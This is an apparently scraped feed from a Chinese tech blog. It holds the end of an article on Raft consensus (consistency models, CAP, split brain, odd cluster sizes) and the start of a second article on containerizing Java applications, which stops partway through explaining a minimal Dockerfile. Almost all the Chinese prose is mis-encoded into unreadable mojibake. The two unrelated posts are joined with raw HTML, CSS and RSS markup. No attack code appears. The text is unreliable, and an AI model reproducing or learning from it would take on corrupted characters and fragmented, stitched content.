<p>åœ¨ä»¥ä¸Šè¯»å†™æµç¨‹ä¸­ï¼ŒRaft åˆ†å¸ƒå¼å…±è¯†ç®—æ³•èƒ½è®©æ¯ä¸ªèŠ‚ç‚¹å¯¹æ—¥å¿—çš„å€¼å’Œé¡ºåºè¾¾æˆå…±è¯†ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½å­˜å‚¨ç›¸åŒçš„æ—¥å¿—å‰¯æœ¬ï¼Œä½¿æ•´ä¸ªç³»ç»Ÿä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½èƒ½æœ‰ä¸€è‡´çš„çŠ¶æ€å’Œè¾“å‡ºï¼Œä½¿å¾—è¿™äº›èŠ‚ç‚¹çœ‹èµ·æ¥å°±åƒä¸€ä¸ªå•ç‹¬çš„ï¼Œé«˜å¯ç”¨çš„çŠ¶æ€æœºã€‚åœ¨ä¸Šæ–‡ä¸­æˆ‘ä»¬æåˆ°è¿‡ Zookeeper ä½¿ç”¨çš„ Zab å…±è¯†ç®—æ³•ä¿è¯çš„æ˜¯é¡ºåºä¸€è‡´æ€§ï¼ŒRaft ç®—æ³•ä¿è¯çš„æ˜¯çº¿æ€§ä¸€è‡´æ€§ï¼Œæ‰€ä»¥å€Ÿç€è¿™ä¸ªå¼•å­ä¹Ÿæ¥è°ˆè°ˆæˆ‘å¯¹ä¸€è‡´æ€§çš„ç†è§£ã€‚</p>
<h4 data-id="heading-5">ä¸€è‡´æ€§</h4>
<p><strong>ä¸€è‡´æ€§</strong> é€šå¸¸æŒ‡çš„å°±æ˜¯æ•°æ®ä¸€è‡´æ€§ï¼Œåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„è¯»å†™è¯·æ±‚ï¼Œè¡¨ç°å¾—åƒåœ¨å•æœºç³»ç»Ÿä¸Šä¸€æ ·ï¼Œç¬¦åˆç›´è§‰å’Œé¢„æœŸã€‚ä¸€è‡´æ€§æ¨¡å‹æœ‰å¾ˆå¤šç§ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬åªè°ˆä»¥ä¸‹å¸¸è§çš„å‡ ç§ï¼š</p>
<p><strong>çº¿æ€§ä¸€è‡´æ€§</strong> æ˜¯æœ€å¼ºçš„ä¸€è‡´æ€§æ¨¡å‹ï¼Œä¹Ÿè¢«ç§°ä¸ºå¼ºä¸€è‡´æ€§ï¼Œåœ¨ CAP å®šç†ä¸­çš„ C è¡¨è¾¾çš„ä¸€è‡´æ€§å«ä¹‰ä¾¿æ˜¯çº¿æ€§ä¸€è‡´æ€§ã€‚è¿™ç§ä¸€è‡´æ€§æ¨¡å‹è¦æ±‚ç³»ç»Ÿè¦åƒå•ä¸€èŠ‚ç‚¹ä¸€æ ·å·¥ä½œï¼Œå¹¶ä¸”æ‰€æœ‰æ“ä½œæ˜¯åŸå­çš„ï¼Œå®ƒæœ‰ä¸¤ä¸ªçº¦æŸæ¡ä»¶ï¼š</p>
<ol>
<li>é¡ºåºè®°å½•ä¸­çš„ä»»ä½•ä¸€æ¬¡è¯»å¿…é¡»è¯»åˆ°æœ€è¿‘ä¸€æ¬¡å†™å…¥çš„æ•°æ®</li>
<li>é¡ºåºè®°å½•è¦è·Ÿå…¨å±€æ—¶é’Ÿä¸‹çš„é¡ºåºä¿æŒä¸€è‡´</li>
</ol>
<p><strong>é¡ºåºä¸€è‡´æ€§</strong> è¦æ¯”çº¿æ€§ä¸€è‡´æ€§å¼±ï¼Œå®ƒåªè¦æ±‚ <strong>åŒä¸€å®¢æˆ·ç«¯æˆ–è¿›ç¨‹çš„æ“ä½œåœ¨æ’åºåä¿æŒå…ˆåé¡ºåºä¸å˜</strong>ï¼Œä½† <strong>ä¸åŒå®¢æˆ·ç«¯ä¹‹é—´çš„å…ˆåé¡ºåºæ˜¯å¯ä»¥ä»»æ„æ”¹å˜çš„</strong>ï¼Œé¡ºåºä¸€è‡´æ€§ä¸çº¿æ€§ä¸€è‡´æ€§çš„ä¸»è¦åŒºåˆ«åœ¨äº <strong>æ²¡æœ‰å…¨å±€æ—¶é—´çš„é™åˆ¶</strong>ã€‚æ¯”å¦‚åœ¨ç¤¾äº¤ç½‘ç»œåœºæ™¯ä¸‹ï¼Œä¸€ä¸ªäººé€šå¸¸ä¸å…³æ³¨ä»–çœ‹åˆ°çš„æ‰€æœ‰æœ‹å‹çš„å¸–å­çš„é¡ºåºï¼Œä½†æ˜¯å¯¹äºæŸä¸ªå…·ä½“æœ‹å‹ï¼Œä»ç„¶ä»¥æ­£ç¡®çš„é¡ºåºæ˜¾ç¤ºå¸–å­çš„é¡ºåºã€‚</p>
<p><strong>å› æœä¸€è‡´æ€§</strong> åˆ™æ˜¯æ¯” <strong>é¡ºåºä¸€è‡´æ€§</strong> æ›´å¼±çš„ä¸€è‡´æ€§æ¨¡å‹ï¼Œå› æœä¸€è‡´æ€§è¦æ±‚å¿…é¡»ä»¥ç›¸åŒçš„é¡ºåºçœ‹åˆ°å› æœç›¸å…³çš„æ“ä½œï¼Œè€Œæ²¡æœ‰å› æœå…³ç³»çš„å¹¶å‘æ“ä½œå¯ä»¥è¢«ä¸åŒçš„è¿›ç¨‹ä»¥ä¸åŒçš„é¡ºåºè§‚å¯Ÿåˆ°ã€‚å…¸å‹çš„ä¾‹å­å°±æ˜¯ç¤¾äº¤ç½‘ç»œä¸­å‘å¸–å’Œè¯„è®ºçš„å…³ç³»ï¼šå¿…é¡»å…ˆæœ‰å‘å¸–æ‰èƒ½å¯¹è¯¥å¸–å­è¿›è¡Œè¯„è®ºï¼Œæ‰€ä»¥å‘å¸–æ“ä½œå¿…é¡»åœ¨è¯„è®ºæ“ä½œä¹‹å‰ã€‚</p>
<p><strong>æœ€ç»ˆä¸€è‡´æ€§</strong> æ˜¯å¸¸è§çš„æœ€å¼±çš„ä¸€è‡´æ€§æ¨¡å‹ï¼Œæ‰€è°“æœ€ç»ˆè¡¨è¾¾çš„å«ä¹‰æ˜¯â€œå¯¹äºç³»ç»Ÿåˆ°è¾¾ç¨³å®šçŠ¶æ€å¹¶æ²¡æœ‰ç¡¬æ€§è¦æ±‚â€ï¼Œå³ä¾¿è¿™å¬èµ·æ¥å¾ˆä¸é è°±ï¼Œä½†æ˜¯åœ¨ä¸šåŠ¡ä¸­è¢«åº”ç”¨çš„å¾ˆå¤šä¹Ÿå¾ˆå¥½ï¼Œè€Œä¸”è¿™ç§ä¸€è‡´æ€§æ¨¡å‹èƒ½ä½¿ç³»ç»Ÿçš„æ€§èƒ½å¾ˆé«˜ã€‚</p>
<blockquote>
<p>CAP å®šç†ï¼šC ä»£è¡¨ä¸€è‡´æ€§ï¼Œå½“å®¢æˆ·ç«¯è®¿é—®æ‰€æœ‰èŠ‚ç‚¹æ—¶ï¼Œè¿”å›çš„éƒ½æ˜¯åŒä¸€ä»½æœ€æ–°çš„æ•°æ®ï¼›A ä»£è¡¨å¯ç”¨æ€§ï¼ŒæŒ‡æ¯æ¬¡è¯·æ±‚éƒ½èƒ½è·å–åˆ°éé”™è¯¯çš„å“åº”ï¼Œä½†ä¸ä¿è¯è·å–çš„æ•°æ®æ˜¯æœ€æ–°çš„ï¼›P ä»£è¡¨åˆ†åŒºå®¹é”™æ€§ï¼ŒèŠ‚ç‚¹ä¹‹é—´ç”±äºç½‘ç»œåˆ†åŒºè€Œå¯¼è‡´æ¶ˆæ¯ä¸¢å¤±çš„æƒ…å†µä¸‹ï¼Œç³»ç»Ÿä»èƒ½æ­£å¸¸è¿è¡Œã€‚</p>
</blockquote>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å†æ¥è°ˆè°ˆè„‘è£‚é—®é¢˜ï¼š</p>
<h4 data-id="heading-6">è„‘è£‚é—®é¢˜</h4>
<p>å½“é›†ç¾¤ä¸­å‘ç”Ÿç½‘ç»œé€šè®¯é—®é¢˜æ—¶ï¼Œè¯»ã€å†™è¯·æ±‚åªèƒ½åœ¨è¶…è¿‡åŠæ•°èŠ‚ç‚¹çš„é›†ç¾¤å†…ç”Ÿæ•ˆï¼Œ<strong>è¿‡åŠæ•°æœºåˆ¶</strong> åœ¨æ•°å­¦ä¸Šä¿è¯ä¸å¯èƒ½åŒæ—¶å­˜åœ¨ä¸¤ä¸ªLeaderï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a27055a414e34de49f3535ab5edc3ec7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=%2B0Ad4lhy3HDsuULhvxDt3rNEVzc%3D" alt="raft8.png" loading="lazy"/></p>
<p>é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä»¥ä¸‹æœºåˆ¶æ¥é¿å…è„‘è£‚é—®é¢˜ï¼š</p>
<ol>
<li><strong>Termæœºåˆ¶</strong>ï¼šæ—¶é—´ä¸Šä¿è¯æ—§Leaderä¼šè‡ªåŠ¨è®©ä½ç»™æ–°Leader</li>
<li><strong>ä¸»åŠ¨stepDown</strong>ï¼šLeaderæ— æ³•è”ç³»åˆ°è¿‡åŠæ•°èŠ‚ç‚¹æ—¶ä¸»åŠ¨æ”¾å¼ƒé¢†å¯¼æƒ</li>
<li><strong>ä¸¥æ ¼çš„æŠ•ç¥¨è§„åˆ™</strong>ï¼šæ¯ä¸ªtermæ¯ä¸ªèŠ‚ç‚¹åªèƒ½æŠ•ç¥¨ç»™ä¸€ä¸ªå€™é€‰äºº</li>
</ol>
<p>å½“ç½‘ç»œé—®é¢˜æ¢å¤æ—¶ï¼ŒFollower èŠ‚ç‚¹èƒ½é€šè¿‡ Leader èŠ‚ç‚¹çš„æ—¥å¿—åŒæ­¥é‡æ–°è¿½å›æœŸé—´é”™è¿‡çš„æ•°æ®ã€‚æ­¤å¤–ï¼Œä¸€èˆ¬é‡‡ç”¨ Raft ç®—æ³•çš„é›†ç¾¤åœ¨éƒ¨ç½²çš„æ—¶éƒ½æ˜¯ <strong>â€œå¥‡æ•°ä¸ªèŠ‚ç‚¹â€</strong> ï¼Œè€Œä¸æ˜¯å¶æ•°ä¸ªèŠ‚ç‚¹ï¼Œè¿™å…¶å®æ˜¯æ•°å­¦çš„ä½“ç°ï¼Œæ€§ä»·æ¯”æ›´é«˜ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5d270d692d348a583b159e1155f515e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=qBmGaB5xSdBKiP6MRSjseeMz8Bs%3D" alt="raft9.png" loading="lazy"/></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè™½ç„¶éƒ¨ç½² 4 ä¸ªèŠ‚ç‚¹å¤šå‡ºä¸€ä¸ªèŠ‚ç‚¹ï¼Œä½†æ˜¯å’Œ 3 èŠ‚ç‚¹é›†ç¾¤ç›¸æ¯”ï¼Œå®¹é”™èƒ½åŠ›æ˜¯ç›¸åŒçš„ï¼šåªèƒ½å®¹å¿ 1 ä¸ªèŠ‚ç‚¹æ•…éšœã€‚åœ¨å®¹é”™èƒ½åŠ›æ²¡æœ‰è¢«æé«˜çš„æƒ…å†µä¸‹åˆèŠ±è´¹äº†æ›´å¤šçš„æœåŠ¡å™¨æˆæœ¬å’Œè¿ç»´ç®¡ç†æˆæœ¬ã€‚</p>
<hr/>
<p>ä»¥ä¸Šæˆ‘ä»¬åŸºæœ¬äº†è§£äº† Raft ç®—æ³•çš„å†…å®¹ï¼Œå¦‚æœæƒ³ä½¿ç”¨ Raft ç®—æ³•ï¼Œå¯¹ç³»ç»Ÿæ¨¡å‹æœ‰ä»¥ä¸‹è¦æ±‚ï¼š</p>
<ol>
<li>æœåŠ¡å¯èƒ½å®•æœºã€åœæ­¢è¿è¡Œï¼Œä½†è¿‡æ®µæ—¶é—´èƒ½å¤Ÿæ¢å¤ï¼Œä½†ä¸èƒ½å­˜åœ¨ <strong>æ‹œå åº­æ•…éšœ</strong></li>
<li>æ¶ˆæ¯å¯èƒ½ä¸¢å¤±ã€å»¶è¿Ÿä¹±åºæˆ–é‡å¤ï¼›å¯èƒ½æœ‰ç½‘ç»œåˆ†åŒºï¼Œå¹¶åœ¨ä¸€æ®µæ—¶é—´ä¹‹åæ¢å¤</li>
</ol>
<hr/>
<h3 data-id="heading-7">å·¨äººçš„è‚©è†€</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.sofastack.tech%2Fprojects%2Fsofa-jraft%2Foverview%2F" target="_blank" title="https://www.sofastack.tech/projects/sofa-jraft/overview/" ref="nofollow noopener noreferrer">SOFAJRaft</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fraft.github.io%2F" target="_blank" title="https://raft.github.io/" ref="nofollow noopener noreferrer">The Raft Consensus Algorithm</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.pingcap.com%2Fblog%2Flease-read%2F" target="_blank" title="https://cn.pingcap.com/blog/lease-read/" ref="nofollow noopener noreferrer">TiKV åŠŸèƒ½ä»‹ç» â€“ Lease Read</a></li>
<li>ã€Šæ·±å…¥ç†è§£åˆ†å¸ƒå¼ç³»ç»Ÿã€‹</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java åº”ç”¨å®¹å™¨åŒ–ä¸éƒ¨ç½²]]></title>    <link>https://juejin.cn/post/7577189654487990322</link>    <guid>https://juejin.cn/post/7577189654487990322</guid>    <pubDate>2025-11-27T06:49:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577189654487990322" data-draft-id="7576978338754854962" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java åº”ç”¨å®¹å™¨åŒ–ä¸éƒ¨ç½²"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-11-27T06:49:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¿¡ç ç”±ç¼°"/> <meta itemprop="url" content="https://juejin.cn/user/2110664941509214"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java åº”ç”¨å®¹å™¨åŒ–ä¸éƒ¨ç½²
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2110664941509214/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¿¡ç ç”±ç¼°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:49:33.000Z" title="Thu Nov 27 2025 06:49:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><em>å¦‚ä½•å¼€å§‹æ‰“åŒ…ã€åˆ†å‘å¹¶å°† Java äº¤ä»˜è‡³ç”Ÿäº§ç¯å¢ƒ</em></p>
<p><img src="https://cf-blog.icodebuddy.com/image/89/89-0.jpg" alt="" loading="lazy"/></p>
<blockquote>
<p><strong>åº”ç”¨ç¨‹åºçš„å®¹å™¨åŒ–</strong> æä¾›äº†ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥å°†æ‰€æœ‰å¿…éœ€çš„åº”ç”¨ç¨‹åºèµ„æºâ€”â€”åŒ…æ‹¬ç¨‹åºå’Œé…ç½®æ–‡ä»¶ã€ç¯å¢ƒå˜é‡ã€ç½‘ç»œè®¾ç½®ç­‰â€”â€”ç»„åˆåˆ°ä¸€ä¸ªæ ‡å‡†åŒ–ã€æ˜“äºç®¡ç†çš„åŒ…ä¸­ã€‚</p>
</blockquote>
<p>ä»å•ä¸ªå®¹å™¨é•œåƒå¯ä»¥å¯åŠ¨ã€è¿è¡Œã€ç®¡ç†å’Œç»ˆæ­¢å¤šä¸ªåŠŸèƒ½ç›¸åŒçš„å®¹å™¨ï¼Œç¡®ä¿ä»é•œåƒåˆ›å»ºç‚¹å¼€å§‹çš„ä¸€è‡´æ€§ã€‚å®¹å™¨å¯ä»¥åœ¨æˆªç„¶ä¸åŒçš„æ“ä½œå¹³å°ä¸Šè¿è¡Œï¼Œä»æœ¬åœ°æœºå™¨åˆ°å…¨çƒå¯æ‰©å±•çš„äº‘ç¯å¢ƒï¼Œä»¥åŠä»‹äºä¸¤è€…ä¹‹é—´çš„ä¸€åˆ‡ã€‚å¯ä»¥æ„å»ºæµæ°´çº¿ï¼Œè½»æ¾åœ°åœ¨å®ƒä»¬ä¹‹é—´è¿‡æ¸¡ã€‚</p>
<p>è™½ç„¶åº”ç”¨ç¨‹åºå®¹å™¨åŒ–æœ‰è®¸å¤šå¥½å¤„ï¼Œä½†è®¸å¤šéƒ½å¯ä»¥å½’ç»“ä¸ºä¸€ä¸ªè¯ï¼š<strong>ä¸€è‡´æ€§</strong>ã€‚</p>
<h2 data-id="heading-0">ä¸ºä½•è¦å¯¹ JAVA åº”ç”¨è¿›è¡Œå®¹å™¨åŒ–ï¼Ÿ</h2>
<p>Java æ—©æœŸçš„ä¸€ä¸ªæ‰¿è¯ºæ˜¯"ä¸€æ¬¡ç¼–å†™ï¼Œåˆ°å¤„è¿è¡Œ"ï¼Œå³"WORA"ã€‚å°½ç®¡ Java é€šè¿‡å…¶ Java è™šæ‹Ÿæœºï¼ˆJVMï¼‰å®ç°äº†æŸç§å½¢å¼çš„ç›®æ ‡ï¼Œä½†åœ¨å®ç°çœŸæ­£æ— ç¼çš„ä½“éªŒæ–¹é¢ä»ç„¶å­˜åœ¨ç›¸å½“å¤šçš„å¤–éƒ¨éšœç¢ã€‚</p>
<p>å®¹å™¨åŒ–è§£å†³äº†å‡ ä¹æ‰€æœ‰è¿™äº›å¤–éƒ¨éšœç¢ã€‚è™½ç„¶ 100% åœ¨ä»»ä½•è¿½æ±‚ä¸­éƒ½å¯èƒ½æ˜¯ä¸€ä¸ªéš¾ä»¥å®ç°çš„ç›®æ ‡ï¼Œä½†å°† Java åº”ç”¨ç¨‹åºçš„å¯æ‰§è¡Œæ–‡ä»¶åŠå…¶æ‰€æœ‰å¿…éœ€çš„ä¾èµ–é¡¹å’Œæ”¯æŒå±æ€§ï¼ˆé…ç½®ç­‰ï¼‰æ‰“åŒ…çš„èƒ½åŠ›ï¼Œä½¿æˆ‘ä»¬è¾¾åˆ°äº†æœ‰æ•ˆçš„ 100% å¯ç§»æ¤æ€§å’Œä¸€è‡´æ€§æ°´å¹³ã€‚</p>
<h2 data-id="heading-1">ä¸º JAVA åº”ç”¨ç¨‹åºåˆ›å»º DOCKERFILE</h2>
<p>è®¸å¤šå¼€å‘äººå‘˜é€šè¿‡ä»”ç»†é˜…è¯»å®˜æ–¹çš„ Dockerfile å‚è€ƒæ–‡æ¡£æ¥å¼€å§‹ä»–ä»¬çš„å®¹å™¨åŒ–å·¥ä½œã€‚ä¸ºäº†ç«‹å³è·å¾—è‰¯å¥½æ•ˆæœï¼Œè®©æˆ‘ä»¬ä»‹ç»å…³é”®ç‚¹ï¼Œåˆ›å»ºä¸€äº›é•œåƒï¼Œå¹¶åœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œæ„å»ºã€‚</p>
<h3 data-id="heading-2">ä¸ºå®¹å™¨åŒ–é€‰æ‹©æ“ä½œç³»ç»Ÿå’Œ JDK æ„å»º</h3>
<p>å¯¹æ­¤æœ‰å„ç§ä¸åŒçš„è§‚ç‚¹ï¼Œä½†å¦‚æœæ‚¨åˆšå¼€å§‹æ¥è§¦å®¹å™¨åŒ–ï¼Œä»ä¸€ä¸ªè¾ƒå°ä½†å®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼ˆOSï¼‰å¼€å§‹æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ç¬¬ä¸€æ­¥ã€‚æˆ‘ä»¬ç¨åå°†è®¨è®ºå…¶ä»–é€‰é¡¹ï¼ˆä¾‹å¦‚ï¼Œæ— å‘è¡Œç‰ˆï¼‰ã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œæ‚¨åœ¨æ“ä½œç³»ç»Ÿå±‚åŒ…å«çš„å†…å®¹è¶Šå¤šï¼Œå®¹å™¨é•œåƒå°±è¶Šå¤§ï¼Œå®‰å…¨æ¼æ´çš„æ”»å‡»é¢ä¹Ÿå°±è¶Šå¤§ã€‚å¯ä¿¡æ¥æºä¹Ÿæ˜¯ä¸€ä¸ªå…³é”®çš„è€ƒè™‘å› ç´ ã€‚å¦‚æœä½¿ç”¨å®Œæ•´çš„æ“ä½œç³»ç»Ÿæ„å»ºï¼Œå¼ºçƒˆæ¨èä½¿ç”¨ eclipse-temurinï¼ˆåŸºäº Ubuntuï¼‰æˆ– Alpine åŸºç¡€å±‚ã€‚</p>
<p>ä»»ä½• OpenJDK çš„æ„å»ºéƒ½èƒ½è¿è¡Œæ‚¨åŸºäº JVM çš„ Java åº”ç”¨ç¨‹åºï¼Œè€Œ Eclipse Temurin æ˜¯ä¼—å¤šè‰¯å¥½é€‰é¡¹ä¹‹ä¸€ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‚¨å¸Œæœ›å¯¹å¯èƒ½å‘ç°çš„ä»»ä½• Java é—®é¢˜è·å¾—ä¸“é—¨çš„ç”Ÿäº§æ”¯æŒï¼Œé‚£ä¹ˆé€‰æ‹©å•†ä¸šæ”¯æŒçš„æ„å»ºå¯ä»¥æä¾›è¿™ç§æ”¯æŒã€‚</p>
<p><img src="https://cf-blog.icodebuddy.com/image/89/89-1.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">JAVA åº”ç”¨çš„åŸºæœ¬ DOCKERFILE ç»“æ„</h3>
<p>ä¸€ä¸ªåŸºæœ¬ Java åº”ç”¨ç¨‹åºçš„æœ€ä½å¯è¡Œ Dockerfile çœ‹èµ·æ¥åƒè¿™æ ·ï¼š</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
FROM eclipse-temurin:latest

COPY java-in-the-can-0.0.1-SNAPSHOT.jar /app.jar

EXPOSE 8080

CMD ["java", "-jar", "/app.jar"]

</code></pre>
<p>å°†ä¸Šè¿°æ–‡æœ¬ï¼ˆåœ¨ <code>COPY</code> æŒ‡ä»¤ä¸­ä½¿ç”¨æ‚¨åº”ç”¨ç¨‹åºçš„åç§°ï¼‰ä¿å­˜åœ¨ä¸€ä¸ªåä¸º <code>Dockerfile</code> çš„æ–‡ä»¶ä¸­ï¼Œè¯¥æ–‡ä»¶ä¸æ‚¨çš„ Java åº”ç”¨ç¨‹åºï¼ˆ<code>.jar</code>ï¼‰æ–‡ä»¶ä½äºåŒä¸€ç›®å½•ã€‚</p>
<p>åœ¨ä¸Šé¢çš„ Dockerfile ä¸­ï¼Œæˆ‘ä»¬æä¾›äº†æ„å»ºå®¹å™¨é•œåƒçš„åŸºæœ¬ä¿¡æ¯ï¼š</p>
<ul>
<li>
<p>æ„å»ºåº”ç”¨ç¨‹åºå®¹å™¨é•œåƒæ‰€åŸºäºçš„æ›´é«˜å±‚<strong>åŸºç¡€é•œåƒ</strong>ï¼ˆ<code>FROM</code>ï¼‰</p>
</li>
<li>
<p>å°† .jar æ–‡ä»¶<strong>å¤åˆ¶</strong>ï¼ˆ<code>COPY</code>ï¼‰åˆ°é•œåƒä¸­ï¼ˆåœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œè¿˜è¿›è¡Œäº†é‡å‘½åï¼‰çš„å‘½ä»¤</p>
</li>
<li>
